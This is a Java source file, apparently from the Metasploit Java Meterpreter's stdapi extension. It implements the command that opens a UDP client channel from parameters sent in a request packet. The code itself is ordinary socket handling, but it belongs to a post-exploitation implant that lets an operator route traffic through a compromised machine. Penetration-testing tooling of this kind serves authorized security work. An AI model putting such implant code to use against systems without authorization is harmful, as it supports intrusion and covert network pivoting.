package com.metasploit.meterpreter.stdapi;

import java.net.DatagramSocket;
import java.net.InetAddress;

import com.metasploit.meterpreter.Channel;
import com.metasploit.meterpreter.DatagramSocketChannel;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;

public class channel_create_stdapi_net_udp_client implements Command {

	public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
		
		String localHost = request.getStringValue(TLVType.TLV_TYPE_LOCAL_HOST);
		int localPort = request.getIntValue(TLVType.TLV_TYPE_LOCAL_PORT);
		String peerHost = request.getStringValue(TLVType.TLV_TYPE_PEER_HOST);
		int peerPort = request.getIntValue(TLVType.TLV_TYPE_PEER_PORT);

		DatagramSocket ds = new DatagramSocket(localPort, InetAddress.getByName(localHost));
		if (peerPort != 0) {
			ds.connect(InetAddress.getByName(peerHost), peerPort);
		}
		Channel channel = new DatagramSocketChannel(meterpreter,ds);
		response.add(TLVType.TLV_TYPE_CHANNEL_ID, channel.getID());
		return ERROR_SUCCESS;
	}

}
